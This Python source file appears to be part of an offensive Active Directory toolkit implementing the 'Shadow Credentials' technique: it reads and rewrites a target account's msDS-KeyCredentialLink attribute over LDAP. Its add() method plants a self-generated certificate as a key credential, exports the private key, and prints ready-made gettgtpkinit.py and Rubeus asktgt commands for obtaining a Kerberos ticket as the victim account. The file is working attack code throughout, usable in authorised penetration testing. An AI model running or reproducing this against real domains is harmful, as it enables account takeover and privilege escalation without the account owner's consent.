import ldap3
import string
import random
import json
import os
import logging
from ldap3.protocol.formatters.formatters import format_sid
from ldap3.utils.conv import escape_filter_chars

from dsinternals.common.data.DNWithBinary import DNWithBinary
from dsinternals.common.data.hello.KeyCredential import KeyCredential
from dsinternals.system.Guid import Guid
from dsinternals.common.cryptography.X509Certificate2 import X509Certificate2
from dsinternals.system.DateTime import DateTime

class ShadowCredentials(object):
    def __init__(self, dumper, ldap_session, target_samname):
        super(ShadowCredentials, self).__init__()
        self.ldap_session = ldap_session
        self.delegate_from = None
        self.target_samname = target_samname
        self.target_dn = None
        self.domain_dumper = dumper


    def info(self, device_id):
        logging.info("Searching for the target account")
        result = self.get_dn_sid_from_samname(self.target_samname)
        if not result:
            logging.error('Target account does not exist! (wrong domain?)')
            return
        else:
            self.target_dn = result[0]
            logging.info("Target user found: %s" % self.target_dn)
        self.ldap_session.search(self.target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
        results = None
        for entry in self.ldap_session.response:
            if entry['type'] != 'searchResEntry':
                continue
            results = entry
        if not results:
            logging.error('Could not query target user properties')
            return
        try:
            device_id_in_current_values = False
            for dn_binary_value in results['raw_attributes']['msDS-KeyCredentialLink']:
                keyCredential = KeyCredential.fromDNWithBinary(DNWithBinary.fromRawDNWithBinary(dn_binary_value))
                if keyCredential.DeviceId.toFormatD() == device_id:
                    logging.critical("Found device Id")
                    keyCredential.show()
                    device_id_in_current_values = True
            if not device_id_in_current_values:
                logging.warning("No value with the provided DeviceID was found for the target object")
        except IndexError:
            logging.info('Attribute msDS-KeyCredentialLink does not exist')
        return


    def list(self):
        logging.info("Searching for the target account")
        result = self.get_dn_sid_from_samname(self.target_samname)
        if not result:
            logging.error('Target account does not exist! (wrong domain?)')
            return
        else:
            self.target_dn = result[0]
            logging.info("Target user found: %s" % self.target_dn)
        self.ldap_session.search(self.target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
        results = None
        for entry in self.ldap_session.response:
            if entry['type'] != 'searchResEntry':
                continue
            results = entry
        if not results:
            logging.error('Could not query target user properties')
            return
        try:
            if len(results['raw_attributes']['msDS-KeyCredentialLink']) == 0:
                logging.info('Attribute msDS-KeyCredentialLink is either empty or user does not have read permissions on that attribute')
            else:
                logging.info("Listing devices for %s" % self.target_samname)
                for dn_binary_value in results['raw_attributes']['msDS-KeyCredentialLink']:
                    keyCredential = KeyCredential.fromDNWithBinary(DNWithBinary.fromRawDNWithBinary(dn_binary_value))
                    logging.critical("DeviceID: %s | Creation Time (UTC): %s" % (keyCredential.DeviceId.toFormatD(), keyCredential.CreationTime))
        except IndexError:
            logging.warning('Attribute msDS-KeyCredentialLink does not exist')
        return

    def add(self, password, path, export_type, domain, dc_ip):
        logging.info("Searching for the target account")
        result = self.get_dn_sid_from_samname(self.target_samname)
        if not result:
            logging.error('Target account does not exist! (wrong domain?)')
            return
        else:
            self.target_dn = result[0]
            logging.info("Target user found: %s" % self.target_dn)
        logging.info("Generating certificate")
        certificate = X509Certificate2(subject=self.target_samname, keySize=2048, notBefore=(-40*365), notAfter=(40*365))
        logging.info("Certificate generated")
        logging.info("Generating KeyCredential")
        keyCredential = KeyCredential.fromX509Certificate2(certificate=certificate, deviceId=Guid(), owner=self.target_dn, currentTime=DateTime())
        logging.info("KeyCredential generated with DeviceID: %s" % keyCredential.DeviceId.toFormatD())
        logging.debug("KeyCredential: %s" % keyCredential.toDNWithBinary().toString())
        self.ldap_session.search(self.target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
        results = None
        for entry in self.ldap_session.response:
            if entry['type'] != 'searchResEntry':
                continue
            results = entry
        if not results:
            logging.error('Could not query target user properties')
            return
        try:
            new_values = results['raw_attributes']['msDS-KeyCredentialLink'] + [keyCredential.toDNWithBinary().toString()]
            logging.info("Updating the msDS-KeyCredentialLink attribute of %s" % self.target_samname)
            self.ldap_session.modify(self.target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]})
            if self.ldap_session.result['result'] == 0:
                logging.critical("Updated the msDS-KeyCredentialLink attribute of the target object")
                if path is None:
                    path = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(8))
                    logging.debug("No filename was provided. The certificate(s) will be stored with the filename: %s" % path)
                if export_type == "PEM":
                    certificate.ExportPEM(path_to_files=path)
                    logging.critical("Saved PEM certificate at path: %s" % path + "_cert.pem")
                    logging.critical("Saved PEM private key at path: %s" % path + "_priv.pem")
                    logging.info("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
                    logging.critical("Run the following command to obtain a TGT")
                    logging.critical("python comm/ticket/gettgtpkinit.py -cert-pem %s_cert.pem -key-pem %s_priv.pem %s/%s %s.ccache -dc-ip %s" % (path, path, domain, self.target_samname, path, dc_ip))
                elif export_type == "PFX":
                    if password is None:
                        password = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(20))
                        logging.debug("No pass was provided. The certificate will be stored with the password: %s" % password)
                    path = "{}_{}".format(path,password)
                    certificate.ExportPFX(password=password, path_to_file=path)
                    logging.critical("Saved PFX (#PKCS12) certificate & key at path: %s" % path + ".pfx")
                    logging.critical("Must be used with password: %s" % password)
                    logging.info("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
                    logging.critical("Run the following command to obtain a TGT")
                    logging.critical("python comm/ticket/gettgtpkinit.py -cert-pfx %s.pfx -pfx-pass %s %s/%s %s.ccache -dc-ip %s" % (path, password, domain, self.target_samname, path, dc_ip))
                    logging.critical("Rubeus.exe asktgt /user:{} /certificate:{}.pfx /password:{} /outfile:{}.tgt /enctype:aes256 /opsec /ptt".format(self.target_samname, path, password, self.target_samname))
            else:
                if self.ldap_session.result['result'] == 50:
                    logging.error('Could not modify object, the server reports insufficient rights: %s' % self.ldap_session.result['message'])
                elif self.ldap_session.result['result'] == 19:
                    logging.error('Could not modify object, the server reports a constrained violation: %s' % self.ldap_session.result['message'])
                else:
                    logging.error('The server returned an error: %s' % self.ldap_session.result['message'])
        except IndexError:
            logging.info('Attribute msDS-KeyCredentialLink does not exist')
        return


    def remove(self, device_id):
        logging.info("Searching for the target account")
        result = self.get_dn_sid_from_samname(self.target_samname)
        if not result:
            logging.error('Target account does not exist! (wrong domain?)')
            return
        else:
            self.target_dn = result[0]
            logging.info("Target user found: %s" % self.target_dn)
        self.ldap_session.search(self.target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
        results = None
        for entry in self.ldap_session.response:
            if entry['type'] != 'searchResEntry':
                continue
            results = entry
        if not results:
            logging.error('Could not query target user properties')
            return
        try:
            new_values = []
            device_id_in_current_values = False
            for dn_binary_value in results['raw_attributes']['msDS-KeyCredentialLink']:
                keyCredential = KeyCredential.fromDNWithBinary(DNWithBinary.fromRawDNWithBinary(dn_binary_value))
                if keyCredential.DeviceId.toFormatD() == device_id:
                    logging.info("Found value to remove")
                    device_id_in_current_values = True
                else:
                    new_values.append(dn_binary_value)
            if device_id_in_current_values:
                logging.info("Updating the msDS-KeyCredentialLink attribute of %s" % self.target_samname)
                self.ldap_session.modify(self.target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]})
                if self.ldap_session.result['result'] == 0:
                    logging.critical("Updated the msDS-KeyCredentialLink attribute of the target object")
                else:
                    if self.ldap_session.result['result'] == 50:
                        logging.error('Could not modify object, the server reports insufficient rights: %s' % self.ldap_session.result['message'])
                    elif self.ldap_session.result['result'] == 19:
                        logging.error('Could not modify object, the server reports a constrained violation: %s' % self.ldap_session.result['message'])
                    else:
                        logging.error('The server returned an error: %s' % self.ldap_session.result['message'])
            else:
                logging.error("No value with the provided DeviceID was found for the target object")
        except IndexError:
            logging.info('Attribute msDS-KeyCredentialLink does not exist')
        return


    def clear(self):
        logging.info("Searching for the target account")
        result = self.get_dn_sid_from_samname(self.target_samname)
        if not result:
            logging.error('Target account does not exist! (wrong domain?)')
            return
        else:
            self.target_dn = result[0]
            logging.info("Target user found: %s" % self.target_dn)
        self.ldap_session.search(self.target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
        results = None
        for entry in self.ldap_session.response:
            if entry['type'] != 'searchResEntry':
                continue
            results = entry
        if not results:
            logging.error('Could not query target user properties')
            return
        try:
            if len(results['raw_attributes']['msDS-KeyCredentialLink']) == 0:
                logging.info('Attribute msDS-KeyCredentialLink is empty')
            else:
                logging.info("Clearing the msDS-KeyCredentialLink attribute of %s" % self.target_samname)
                self.ldap_session.modify(self.target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, []]})
                if self.ldap_session.result['result'] == 0:
                    logging.critical('msDS-KeyCredentialLink cleared successfully!')
                else:
                    if self.ldap_session.result['result'] == 50:
                        logging.error('Could not modify object, the server reports insufficient rights: %s' % self.ldap_session.result['message'])
                    elif self.ldap_session.result['result'] == 19:
                        logging.error('Could not modify object, the server reports a constrained violation: %s' % self.ldap_session.result['message'])
                    else:
                        logging.error('The server returned an error: %s' % self.ldap_session.result['message'])
                return
        except IndexError:
            logging.info('Attribute msDS-KeyCredentialLink does not exist')
        return


    def importFromJSON(self, filename):
        logging.info("Searching for the target account")
        result = self.get_dn_sid_from_samname(self.target_samname)
        if not result:
            logging.error('Target account does not exist! (wrong domain?)')
            return
        else:
            self.target_dn = result[0]
            logging.info("Target user found: %s" % self.target_dn)
        self.ldap_session.search(self.target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
        results = None
        for entry in self.ldap_session.response:
            if entry['type'] != 'searchResEntry':
                continue
            results = entry
        if not results:
            logging.error('Could not query target user properties')
            return
        try:
            if os.path.exists(filename):
                keyCredentials = []
                with open(filename, "r") as f:
                    data = json.load(f)
                    for kcjson in data["keyCredentials"]:
                        keyCredentials.append(KeyCredential.fromDict(kcjson).toDNWithBinary().toString())
            logging.info("Modifying the msDS-KeyCredentialLink attribute of %s" % self.target_samname)
            self.ldap_session.modify(self.target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, keyCredentials]})
            if self.ldap_session.result['result'] == 0:
                logging.critical('msDS-KeyCredentialLink modified successfully!')
            else:
                if self.ldap_session.result['result'] == 50:
                    logging.error('Could not modify object, the server reports insufficient rights: %s' % self.ldap_session.result['message'])
                elif self.ldap_session.result['result'] == 19:
                    logging.error('Could not modify object, the server reports a constrained violation: %s' % self.ldap_session.result['message'])
                else:
                    logging.error('The server returned an error: %s' % self.ldap_session.result['message'])
            return
        except IndexError:
            logging.info('Attribute msDS-KeyCredentialLink does not exist')
        return


    def exportToJSON(self, filename):
        logging.info("Searching for the target account")
        result = self.get_dn_sid_from_samname(self.target_samname)
        if not result:
            logging.error('Target account does not exist! (wrong domain?)')
            return
        else:
            self.target_dn = result[0]
            logging.info("Target user found: %s" % self.target_dn)
        self.ldap_session.search(self.target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
        results = None
        for entry in self.ldap_session.response:
            if entry['type'] != 'searchResEntry':
                continue
            results = entry
        if not results:
            logging.error('Could not query target user properties')
            return
        try:
            if filename is None:
                filename = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(8)) + ".json"
                logging.debug("No filename was provided. The keyCredential(s) will be stored with the filename: %s" % filename)
            if len(os.path.dirname(filename)) != 0:
                if not os.path.exists(os.path.dirname(filename)):
                    os.makedirs(os.path.dirname(filename), exist_ok=True)
            keyCredentialsJSON = {"keyCredentials":[]}
            for dn_binary_value in results['raw_attributes']['msDS-KeyCredentialLink']:
                keyCredential = KeyCredential.fromDNWithBinary(DNWithBinary.fromRawDNWithBinary(dn_binary_value))
                keyCredentialsJSON["keyCredentials"].append(keyCredential.toDict())
            with open(filename, "w") as f:
                f.write(json.dumps(keyCredentialsJSON, indent=4))
            logging.critical("Saved JSON dump at path: %s" % filename)
        except IndexError:
            logging.info('Attribute msDS-KeyCredentialLink does not exist')
        return


    def get_dn_sid_from_samname(self, samname):
        self.ldap_session.search(self.domain_dumper.root, '(sAMAccountName=%s)' % escape_filter_chars(samname), attributes=['objectSid'])
        try:
            dn = self.ldap_session.entries[0].entry_dn
            sid = format_sid(self.ldap_session.entries[0]['objectSid'].raw_values[0])
            return dn, sid
        except IndexError:
            logging.error('User not found in LDAP: %s' % samname)
            return False

    def get_sid_info(self, sid):
        self.ldap_session.search(self.domain_dumper.root, '(objectSid=%s)' % escape_filter_chars(sid), attributes=['samaccountname'])
        try:
            dn = self.ldap_session.entries[0].entry_dn
            samname = self.ldap_session.entries[0]['samaccountname']
            return dn, samname
        except IndexError:
            logging.error('SID not found in LDAP: %s' % sid)
            return False